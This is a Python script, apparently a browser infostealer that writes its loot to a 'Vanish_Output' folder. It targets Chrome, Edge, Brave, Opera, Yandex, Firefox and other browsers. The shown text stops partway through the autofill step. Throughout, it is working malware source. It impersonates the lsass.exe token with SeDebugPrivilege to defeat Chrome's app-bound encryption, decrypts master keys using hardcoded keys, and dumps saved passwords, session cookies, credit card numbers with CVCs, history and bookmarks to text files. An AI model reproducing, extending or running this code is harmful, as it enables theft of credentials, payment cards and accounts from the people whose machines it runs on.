import os
import io
import json
import struct
import ctypes
import shutil
import windows
import sqlite3
import pathlib
import binascii
import subprocess
import windows.crypto
import windows.security
import windows.generated_def as gdef
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305
import logging
import sys
import base64
from datetime import datetime, timedelta

logging.basicConfig(
    level=logging.DEBUG,
    format='[%(asctime)s] [%(levelname)-8s] %(message)s',
    datefmt='%H:%M:%S',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

def log(msg, level="INFO"):

    print(f"[*] {msg}")
    if level == "DEBUG":
        logger.debug(msg)
    elif level == "WARNING":
        logger.warning(msg)
    elif level == "ERROR":
        logger.error(msg)
    else:
        logger.info(msg)

import argparse

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--output-path', type=str, help='Base output directory')
    # Fallback for old way where it might be the first positional arg
    parser.add_argument('positional_path', nargs='?', type=str, help='Base output directory (positional)')
    return parser.parse_known_args()

args, unknown = parse_args()

if args.output_path:
    OUTPUT_BASE_DIR = pathlib.Path(args.output_path)
elif args.positional_path:
    OUTPUT_BASE_DIR = pathlib.Path(args.positional_path) / 'Vanish_Output'
else:
    OUTPUT_BASE_DIR = pathlib.Path(os.path.dirname(os.path.abspath(__file__))) / 'Vanish_Output'

log(f"Output base directory: {OUTPUT_BASE_DIR}")

BROWSERS = {
    'chrome': {
        'name': 'Google Chrome',
        'type': 'chromium',
        'data_path': r'AppData\Local\Google\Chrome\User Data',
        'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chromekey1'
    },
    'brave': {
        'name': 'Brave',
        'type': 'chromium',
        'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
        'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
        'process_name': 'brave.exe',
        'key_name': 'Brave Softwarekey1'
    },
    'edge': {
        'name': 'Microsoft Edge',
        'type': 'chromium',
        'data_path': r'AppData\Local\Microsoft\Edge\User Data',
        'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
        'process_name': 'msedge.exe',
        'key_name': 'Microsoft Edgekey1'
    },
    'opera': {
        'name': 'Opera',
        'type': 'chromium',
        'data_path': r'AppData\Roaming\Opera Software\Opera Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1'
    },
    'opera_gx': {
        'name': 'Opera GX',
        'type': 'chromium',
        'data_path': r'AppData\Roaming\Opera Software\Opera GX Stable',
        'local_state': r'AppData\Roaming\Opera Software\Opera GX Stable\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1'
    },
    'firefox': {
        'name': 'Firefox',
        'type': 'gecko',
        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
        'process_name': 'firefox.exe'
    },
    'chrome_beta': {
        'name': 'Google Chrome Beta',
        'type': 'chromium',
        'data_path': r'AppData\Local\Google\Chrome Beta\User Data',
        'local_state': r'AppData\Local\Google\Chrome Beta\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chrome Betakey1'
    },
    'chromium': {
        'name': 'Chromium',
        'type': 'chromium',
        'data_path': r'AppData\Local\Chromium\User Data',
        'local_state': r'AppData\Local\Chromium\User Data\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Chromiumkey1'
    },
    'vivaldi': {
        'name': 'Vivaldi',
        'type': 'chromium',
        'data_path': r'AppData\Local\Vivaldi\User Data',
        'local_state': r'AppData\Local\Vivaldi\User Data\Local State',
        'process_name': 'vivaldi.exe',
        'key_name': 'Vivaldikey1'
    },
    'yandex': {
        'name': 'Yandex Browser',
        'type': 'chromium',
        'data_path': r'AppData\Local\Yandex\YandexBrowser\User Data',
        'local_state': r'AppData\Local\Yandex\YandexBrowser\User Data\Local State',
        'process_name': 'browser.exe',
        'key_name': 'Yandex Browserkey1'
    },
    'coccoc': {
        'name': 'CocCoc Browser',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\CocCoc\\Browser\\User Data',
        'local_state': r'AppData\\Local\\CocCoc\\Browser\\User Data\\Local State',
        'process_name': 'browser.exe',
        'key_name': 'CocCoc Browserkey1'
    },
    'qq': {
        'name': 'QQ Browser',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\Tencent\\QQBrowser\\User Data',
        'local_state': r'AppData\\Local\\Tencent\\QQBrowser\\User Data\\Local State',
        'process_name': 'QQBrowser.exe',
        'key_name': 'QQ Browserkey1'
    },
    '360speed': {
        'name': '360 Speed',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\360Chrome\\Chrome\\User Data',
        'local_state': r'AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Speedkey1'
    },
    '360secure': {
        'name': '360 Secure',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\360Chrome\\Chrome\\User Data',
        'local_state': r'AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Securekey1'
    },
    'firefox_beta': {
        'name': 'Firefox Beta',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_dev': {
        'name': 'Firefox Developer',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_esr': {
        'name': 'Firefox ESR',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_nightly': {
        'name': 'Firefox Nightly',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    }
}

class SECItem(ctypes.Structure):
    _fields_ = [('type', ctypes.c_uint),
                ('data', ctypes.c_void_p),
                ('len', ctypes.c_uint)]

class NSSHandler:
    def __init__(self):
        self.nss = None
        self.loaded = False
        self._load_library()
    def _load_library(self):
        paths = [
            r"C:\Program Files\Mozilla Firefox\nss3.dll",
            r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"
        ]
        for path in paths:
            if os.path.exists(path):
                try:
                    log(f"Loading NSS library from: {path}", "DEBUG")
                    try:
                        os.add_dll_directory(os.path.dirname(path))
                    except AttributeError:
                        os.environ['PATH'] = os.path.dirname(path) + ';' + os.environ['PATH']
                    self.nss = ctypes.CDLL(path)
                    self.nss.NSS_Init.argtypes = [ctypes.c_char_p]
                    self.nss.NSS_Init.restype = ctypes.c_int
                    self.nss.NSS_Shutdown.argtypes = []
                    self.nss.NSS_Shutdown.restype = ctypes.c_int
                    self.nss.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p]
                    self.nss.PK11SDR_Decrypt.restype = ctypes.c_int
                    self.loaded = True
                    log(f"NSS library loaded successfully from: {path}")
                    return
                except Exception as e:
                    log(f"Failed to load NSS from {path}: {e}", "ERROR")
        log("NSS library not found in any known path", "WARNING")
    def init_profile(self, profile_path):
        if not self.loaded: return False
        try:
            log(f"Initializing NSS for profile: {profile_path}", "DEBUG")
            if not (pathlib.Path(profile_path) / "cert9.db").exists() and not (pathlib.Path(profile_path) / "cert8.db").exists():
                log(f"No cert DB found in {profile_path}, skipping NSS init", "WARNING")
                return False
            ret = self.nss.NSS_Init(str(profile_path).encode('utf-8'))
            if ret != 0:
                log(f"NSS_Init failed with code {ret}", "ERROR")
                return False
            log(f"NSS initialized successfully for: {profile_path}")
            return True
        except Exception as e:
            log(f"Error in NSS_Init: {e}", "ERROR")
            return False
    def shutdown(self):
        if self.loaded:
            try:
                self.nss.NSS_Shutdown()
                log("NSS shutdown complete", "DEBUG")
            except Exception:
                pass
    def decrypt(self, encrypted_b64):
        if not self.loaded: return None
        try:
            encrypted_data = base64.b64decode(encrypted_b64)
            input_item = SECItem(0, ctypes.cast(ctypes.create_string_buffer(encrypted_data), ctypes.c_void_p), len(encrypted_data))
            output_item = SECItem(0, None, 0)
            ret = self.nss.PK11SDR_Decrypt(ctypes.byref(input_item), ctypes.byref(output_item), None)
            if ret == 0:
                decrypted_data = ctypes.string_at(output_item.data, output_item.len)
                return decrypted_data.decode('utf-8')
            else:
                return None
        except Exception as e:
            log(f"Error decrypting with NSS: {e}", "ERROR")
            return None

def is_admin():
    try:
        result = ctypes.windll.shell32.IsUserAnAdmin() != 0
        log(f"Admin check: {'YES - Running as admin' if result else 'NO - Not admin'}", "DEBUG")
        return result
    except Exception as e:
        log(f"Error checking admin status: {e}", "ERROR")
        return False

@contextmanager
def impersonate_lsass():
    log("Attempting LSASS impersonation...", "DEBUG")
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        log("SeDebugPrivilege enabled", "DEBUG")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        log(f"Found lsass.exe (PID: {proc.pid})", "DEBUG")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        log("LSASS impersonation successful", "DEBUG")
        yield
    except Exception as e:
        log(f"Failed to impersonate LSASS: {e}", "ERROR")
        raise
    finally:
        windows.current_thread.token = original_token
        log("Reverted to original token", "DEBUG")

def parse_key_blob(blob_data: bytes) -> dict:
    try:
        log(f"Parsing key blob ({len(blob_data)} bytes)", "DEBUG")
        buffer = io.BytesIO(blob_data)
        parsed_data = {}
        header_len = struct.unpack('<I', buffer.read(4))[0]
        parsed_data['header'] = buffer.read(header_len)
        content_len = struct.unpack('<I', buffer.read(4))[0]
        if header_len + content_len + 8 != len(blob_data):
            log(f"Blob size mismatch: header({header_len}) + content({content_len}) + 8 != total({len(blob_data)})", "WARNING")
        parsed_data['flag'] = buffer.read(1)[0]
        log(f"Key blob flag: {parsed_data['flag']}", "DEBUG")
        if parsed_data['flag'] in (1, 2):
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
            log(f"Flag {parsed_data['flag']}: IV({len(parsed_data['iv'])}b), Ciphertext({len(parsed_data['ciphertext'])}b), Tag({len(parsed_data['tag'])}b)", "DEBUG")
        elif parsed_data['flag'] == 3:
            parsed_data['encrypted_aes_key'] = buffer.read(32)
            parsed_data['iv'] = buffer.read(12)
            parsed_data['ciphertext'] = buffer.read(32)
            parsed_data['tag'] = buffer.read(16)
            log(f"Flag 3: EncAESKey({len(parsed_data['encrypted_aes_key'])}b), IV({len(parsed_data['iv'])}b), Ciphertext({len(parsed_data['ciphertext'])}b), Tag({len(parsed_data['tag'])}b)", "DEBUG")
        else:
            parsed_data['raw_data'] = buffer.read()
            log(f"Unknown flag {parsed_data['flag']}, raw data: {len(parsed_data['raw_data'])} bytes", "WARNING")
        return parsed_data
    except Exception as e:
        log(f"Error parsing key blob: {e}", "ERROR")
        raise

def decrypt_with_cng(input_data, key_name):
    log(f"CNG decryption starting (key: {key_name}, data: {len(input_data)} bytes)", "DEBUG")
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    if status != 0:
        log(f"NCryptOpenStorageProvider failed with status: 0x{status:08X}", "ERROR")
        return b''
    log("NCryptOpenStorageProvider OK", "DEBUG")
    hKey = gdef.NCRYPT_KEY_HANDLE()
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    if status != 0:
        log(f"NCryptOpenKey failed with status: 0x{status:08X} (key: {key_name})", "ERROR")
        ncrypt.NCryptFreeObject(hProvider)
        return b''
    log(f"NCryptOpenKey OK (key: {key_name})", "DEBUG")
    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
    if status != 0:
        log(f"NCryptDecrypt (size query) failed with status: 0x{status:08X}", "ERROR")
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return b''
    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()
    log(f"NCryptDecrypt buffer allocated: {buffer_size} bytes", "DEBUG")
    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                  ctypes.byref(pcbResult), 0x40)
    if status != 0:
        log(f"NCryptDecrypt (final) failed with status: 0x{status:08X}", "ERROR")
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        return b''
    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    log(f"CNG decryption successful ({pcbResult.value} bytes decrypted)", "DEBUG")
    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
    log(f"Deriving v20 master key (flag: {parsed_data.get('flag')}, key: {key_name})", "DEBUG")
    try:
        if parsed_data['flag'] == 1:
            log("Using AES-GCM with hardcoded key (flag 1)", "DEBUG")
            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            result = cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
            log(f"v20 master key derived (flag 1): {len(result)} bytes", "DEBUG")
            return result
        elif parsed_data['flag'] == 2:
            log("Using ChaCha20-Poly1305 with hardcoded key (flag 2)", "DEBUG")
            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
            cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
            result = cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
            log(f"v20 master key derived (flag 2): {len(result)} bytes", "DEBUG")
            return result
        elif parsed_data['flag'] == 3:
            log("Using CNG + XOR + AES-GCM (flag 3)", "DEBUG")
            xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
            with impersonate_lsass():
                decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
            if not decrypted_aes_key:
                log("Failed to decrypt AES key with CNG", "ERROR")
                return b''
            xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
            cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
            result = cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
            log(f"v20 master key derived (flag 3): {len(result)} bytes", "DEBUG")
            return result
        else:
            log(f"Unknown flag: {parsed_data.get('flag')}, returning raw data", "WARNING")
            return parsed_data.get('raw_data', b'')
    except Exception as e:
        log(f"Error deriving master key: {e}", "ERROR")
        return b''

def decrypt_v20_value(encrypted_value, master_key):
    try:
        iv = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted[32:].decode('utf-8')
    except Exception as e:
        return None

def decrypt_v20_password(encrypted_password, master_key):
    try:
        if not encrypted_password:
            return ""
        if not encrypted_password.startswith(b'v20') and not encrypted_password.startswith(b'v10'):
             pass
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
        decrypted_pass = cipher.decrypt_and_verify(payload[:-16], payload[-16:])
        try:
            return decrypted_pass.decode('utf-8')
        except UnicodeDecodeError:
            try:
                return decrypted_pass.decode('cp1252')
            except UnicodeDecodeError:
                return decrypted_pass.decode('utf-8', errors='replace')
    except Exception as e:
        return f"<decryption_failed: {e}>"

def fetch_sqlite_copy(db_path):
    try:
        tmp_path = pathlib.Path(os.environ['TEMP']) / pathlib.Path(db_path).name
        log(f"Copying DB: {db_path} -> {tmp_path}", "DEBUG")
        shutil.copy2(db_path, tmp_path)
        return tmp_path
    except Exception as e:
        log(f"Error copying SQLite DB {db_path}: {e}", "ERROR")
        return None

def get_chrome_datetime(timestamp):
    try:
        if not timestamp:
            return "Unknown"
        epoch = datetime(1601, 1, 1)
        return (epoch + timedelta(microseconds=timestamp)).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "Unknown"

def extract_bookmarks(profile_path):
    bookmarks_path = profile_path / "Bookmarks"
    if not bookmarks_path.exists():
        return []
    try:
        with open(bookmarks_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        bookmarks = []
        def process_node(node):
            if isinstance(node, dict):
                if node.get("type") == "url":
                    name = node.get("name", "Unknown")
                    url = node.get("url", "Unknown")
                    bookmarks.append(f"{name}\t{url}")
                if "children" in node:
                    for child in node["children"]:
                        process_node(child)
        if "roots" in data:
            for root in data["roots"].values():
                process_node(root)
        return bookmarks
    except Exception as e:
        log(f"Error extracting bookmarks: {e}", "ERROR")
        return []

def extract_history(profile_path):
    history_db = profile_path / "History"
    if not history_db.exists():
        return []
    db_copy = fetch_sqlite_copy(history_db)
    if not db_copy:
        return []
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        history_items = []
        for url, title, visit_count, last_visit in rows:
            date_str = get_chrome_datetime(last_visit)
            history_items.append(f"{url}\t{title}\t{visit_count}\t{date_str}")
        return history_items
    except Exception as e:
        log(f"Error extracting history: {e}", "ERROR")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def extract_credit_cards(profile_path, master_key):
    web_data_db = profile_path / "Web Data"
    if not web_data_db.exists():
        return []
    db_copy = fetch_sqlite_copy(web_data_db)
    if not db_copy:
        return []
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()

        local_cvcs = {}
        try:
            cur.execute("SELECT guid, value_encrypted FROM local_stored_cvc")
            for guid, encrypted in cur.fetchall():
                local_cvcs[guid] = encrypted
        except sqlite3.OperationalError:
            pass
        server_cvcs = {}
        try:
            cur.execute("SELECT instrument_id, value_encrypted FROM server_stored_cvc")
            for inst_id, encrypted in cur.fetchall():
                server_cvcs[str(inst_id)] = encrypted
        except sqlite3.OperationalError:
            pass
        cards = []

        try:
            cur.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for guid, name, exp_m, exp_y, enc_num in cur.fetchall():
                try:
                    decrypted_num = decrypt_v20_password(enc_num, master_key)
                    if decrypted_num.startswith("<decryption_failed"):
                         decrypted_num = "DECRYPT_FAILED"
                    cvc = "N/A"
                    if guid in local_cvcs:
                        decrypted_cvc = decrypt_v20_password(local_cvcs[guid], master_key)
                        if not decrypted_cvc.startswith("<decryption_failed"):
                            cvc = decrypted_cvc
                    cards.append(f"================\nGUID: {guid}\nNAME: {name}\nNUMBER: {decrypted_num}\nVALID: {exp_m}/{exp_y}\nCVC: {cvc}\nTYPE: Local Card")
                except Exception as e:
                    log(f"Error processing local card {guid}: {e}", "ERROR")
        except sqlite3.OperationalError as e:
            log(f"OperationalError querying credit_cards: {e}", "ERROR")

        try:
            cur.execute("SELECT id, name_on_card, exp_month, exp_year, last_four FROM masked_credit_cards")
            for card_id, name, exp_m, exp_y, last_four in cur.fetchall():
                try:
                    decrypted_num = f"**** **** **** {last_four}"
                    cvc = "N/A"
                    if str(card_id) in server_cvcs and master_key:
                        decrypted_cvc = decrypt_v20_password(server_cvcs[str(card_id)], master_key)
                        if not decrypted_cvc.startswith("<decryption_failed"):
                            cvc = decrypted_cvc
                    cards.append(f"================\nID: {card_id}\nNAME: {name}\nNUMBER: {decrypted_num}\nVALID: {exp_m}/{exp_y}\nCVC: {cvc}\nTYPE: Masked/Server Card")
                except Exception as e:
                    log(f"Error processing server card {card_id}: {e}", "ERROR")
        except sqlite3.OperationalError as e:
            log(f"OperationalError querying masked_credit_cards: {e}", "ERROR")
        con.close()
        try: os.remove(db_copy)
        except: pass
        return cards
    except Exception as e:
        log(f"Error extracting credit cards: {e}", "ERROR")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def get_master_key(browser_config):
    log(f"Getting master key for {browser_config['name']}...")
    try:
        user_profile = os.environ['USERPROFILE']
        local_state_path = os.path.join(user_profile, browser_config['local_state'])
        log(f"  Local State path: {local_state_path}", "DEBUG")
        if not os.path.exists(local_state_path):
            log(f"  Local State file NOT FOUND: {local_state_path}", "WARNING")
            return None
        log(f"  Local State file exists, reading...", "DEBUG")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        try:
            if "os_crypt" in local_state and "app_bound_encrypted_key" in local_state["os_crypt"]:
                log(f"  Found app_bound_encrypted_key (v20 encryption)", "DEBUG")
                key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["app_bound_encrypted_key"])[4:]
                log(f"  Encrypted key blob: {len(key_blob_encrypted)} bytes", "DEBUG")
                log(f"  Decrypting system key via LSASS impersonation...", "DEBUG")
                with impersonate_lsass():
                    key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
                log(f"  System key decrypted: {len(key_blob_system_decrypted)} bytes", "DEBUG")
                log(f"  Decrypting user key via DPAPI...", "DEBUG")
                key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
                log(f"  User key decrypted: {len(key_blob_user_decrypted)} bytes", "DEBUG")
                log(f"  Parsing decrypted key blob...", "DEBUG")
                parsed_data = parse_key_blob(key_blob_user_decrypted)
                if parsed_data['flag'] not in (1, 2, 3):
                    log(f"  Unknown flag {parsed_data['flag']}, returning last 32 bytes as raw key", "DEBUG")
                    return key_blob_user_decrypted[-32:]
                log(f"  Deriving final master key (flag: {parsed_data['flag']})...", "DEBUG")
                master_key = derive_v20_master_key(parsed_data, browser_config['key_name'])
                if master_key:
                    log(f"  Master key derived successfully ({len(master_key)} bytes)")
                else:
                    log(f"  Master key derivation returned empty!", "ERROR")
                return master_key
        except Exception as e:
            log(f"  App-Bound key extraction failed: {e}", "WARNING")
            log(f"  Trying legacy DPAPI fallback...", "WARNING")

        if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            log(f"  Found encrypted_key (Legacy DPAPI / v10)", "DEBUG")
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = windows.crypto.dpapi.unprotect(key_blob_encrypted)
            log(f"  Legacy DPAPI master key decrypted ({len(master_key)} bytes)")
            return master_key
        log("  No valid encrypted key found in Local State!", "WARNING")
        return None
    except Exception as e:
        log(f"  Error getting master key: {e}", "ERROR")
        return None

def process_chromium_browser(browser_name, browser_config):
    log(f"{'='*60}")
    log(f"Processing browser: {browser_config['name']} ({browser_name})")
    log(f"{'='*60}")
    user_profile = os.environ['USERPROFILE']
    browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
    if not browser_data_path.exists():
        log(f"  Browser data path NOT FOUND: {browser_data_path}", "WARNING")
        return
    log(f"  Browser data path: {browser_data_path}")
    master_key = get_master_key(browser_config)
    if not master_key:
        log(f"  WARNING: Could not retrieve master key - passwords/cookies will NOT be decrypted", "WARNING")
    else:
        log(f"  Master key retrieved: {len(master_key)} bytes")
    profiles = [p for p in browser_data_path.iterdir() if
                p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
    log(f"  Found {len(profiles)} profile(s): {[p.name for p in profiles]}")
    for profile_dir in profiles:
        profile_name = profile_dir.name.lower()
        log(f"  --- Processing profile: {profile_name} ---")
        profile_output_dir = OUTPUT_BASE_DIR / browser_name / profile_name
        profile_output_dir.mkdir(parents=True, exist_ok=True)
        log(f"  Output directory: {profile_output_dir}", "DEBUG")
        password_file = profile_output_dir / "passwords.txt"
        autofill_file = profile_output_dir / "auto_fills.txt"
        cookies_file = profile_output_dir / "cookies.txt"
        bookmarks_file = profile_output_dir / "bookmarks.txt"
        history_file = profile_output_dir / "history.txt"
        credit_cards_file = profile_output_dir / "credit_cards.txt"
        cookie_db_path = profile_dir / "Network" / "Cookies"
        login_db_path = profile_dir / "Login Data"
        webdata_db_path = profile_dir / "Web Data"

        log(f"  [Bookmarks] Extracting...", "DEBUG")
        bookmarks = extract_bookmarks(profile_dir)
        if bookmarks:
            with open(bookmarks_file, "w", encoding="utf-8") as f:
                f.write("Name\tURL\n")
                for b in bookmarks:
                    f.write(f"{b}\n")
            log(f"  [Bookmarks] Extracted {len(bookmarks)} bookmarks -> {bookmarks_file.name}")
        else:
            log(f"  [Bookmarks] None found", "DEBUG")

        log(f"  [History] Extracting...", "DEBUG")
        history = extract_history(profile_dir)
        if history:
            with open(history_file, "w", encoding="utf-8") as f:
                f.write("URL\tTitle\tVisit Count\tLast Visit\n")
                for h in history:
                    f.write(f"{h}\n")
            log(f"  [History] Extracted {len(history)} items -> {history_file.name}")
        else:
            log(f"  [History] None found", "DEBUG")

        log(f"  [CreditCards] Extracting...", "DEBUG")
        cards = extract_credit_cards(profile_dir, master_key)
        if cards:
            with open(credit_cards_file, "w", encoding="utf-8") as f:
                f.write("Credit Cards\n")
                for c in cards:
                    f.write(f"{c}\n\n")
            log(f"  [CreditCards] Extracted {len(cards)} cards -> {credit_cards_file.name}")
        else:
            log(f"  [CreditCards] None found", "DEBUG")

        log(f"  [Cookies] Extracting...", "DEBUG")
        try:
            if cookie_db_path.exists():
                log(f"  [Cookies] DB found: {cookie_db_path}", "DEBUG")
                cookie_copy = fetch_sqlite_copy(cookie_db_path)
                if cookie_copy:
                    con = sqlite3.connect(cookie_copy)
                    cur = con.cursor()
                    cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies;")
                    cookies = cur.fetchall()
                    log(f"  [Cookies] Found {len(cookies)} cookies in DB", "DEBUG")
                    with open(cookies_file, "w", encoding="utf-8") as f:
                        f.write("Netscape HTTP Cookie File\n")
                        f.write("domain\tflag\tpath\tsecure\texpiration\tname\tvalue\n")
                        success_count = 0
                        for host, name, path, expires, secure, httponly, encrypted_value in cookies:
                            if encrypted_value and (encrypted_value[:3] in (b"v10", b"v11", b"v20")):
                                decrypted = decrypt_v20_value(encrypted_value, master_key)
                                value_str = decrypted if decrypted else "DECRYPT_FAILED"
                                if decrypted:
                                    success_count += 1
                                flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
                                secure_str = "TRUE" if secure else "FALSE"
                                try:
                                    secs = int(expires) // 1000000
                                except Exception:
                                    secs = 0
                                unix_exp = secs - 11644473600 if secs > 11644473600 else 0
                                path_str = path if path else "/"
                                line = f"{host}\t{flag}\t{path_str}\t{secure_str}\t{unix_exp}\t{name}\t{value_str}\n"
                                f.write(line)
                    log(f"  [Cookies] Decrypted {success_count}/{len(cookies)} cookies -> {cookies_file.name}")
                    con.close()
                    try: os.remove(cookie_copy)
                    except: pass
            else:
                log(f"  [Cookies] No cookie DB found at: {cookie_db_path}", "DEBUG")
        except Exception as e:
            log(f"  [Cookies] Error: {e}", "ERROR")

        log(f"  [Passwords] Extracting...", "DEBUG")
        try:
            if login_db_path.exists():
                log(f"  [Passwords] DB found: {login_db_path}", "DEBUG")
                con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
                cur = con.cursor()
                cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins;")
                logins = cur.fetchall()
                log(f"  [Passwords] Found {len(logins)} login entries", "DEBUG")
                with open(password_file, "w", encoding="utf-8") as f:
                    f.write("Passwords\n")
                    success_count = 0
                    for login in logins:
                        if login[2]:
                            prefix = login[2][:3]
                            log(f"  [Passwords] Entry: {login[0]} | prefix: {prefix}", "DEBUG")
                            if (login[2][:3] in (b"v10", b"v11", b"v20")):
                                decrypted = decrypt_v20_password(login[2], master_key)
                                if decrypted and not decrypted.startswith("<decryption_failed"):
                                    success_count += 1
                                elif decrypted and decrypted.startswith("<decryption_failed"):
                                    log(f"  [Passwords] DECRYPT FAILED for {login[0]}: {decrypted}", "WARNING")
                                    if login[2].startswith(b'v20') and "MAC check failed" in str(decrypted):
                                        log(f"  [Passwords] CRITICAL: v20 data but key invalid! Check app_bound_encrypted_key", "ERROR")
                            f.write(f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {decrypted}\n\n")
                log(f"  [Passwords] Decrypted {success_count}/{len(logins)} passwords -> {password_file.name}")
                con.close()
            else:
                log(f"  [Passwords] No login DB found at: {login_db_path}", "DEBUG")
        except Exception as e:
            log(f"  [Passwords] Error: {e}", "ERROR")

        log(f"  [Autofill] Extracting...", "DEBUG")
        try:
            if webdata_db_path.exists():
                log(f"  [Autofill] DB found: {webdata_db_path}", "DEBUG")
                db_copy = fetch_sqlite_copy(webdata_db_path)
                if db_copy:
                    con = sqlite3.connect(db_copy)
                    cur = con.cursor()
                    cur.execute("SELECT name, value FROM autofill;")
                    autofills = cur.fetchall()
                    log(f"  [Autofill] Found {len(autofills)} entries", "DEBUG")
                    with open(autofill_file, "a", encoding="utf-8") as f:
                        for name, value in autofills:
                            if name and name.strip():
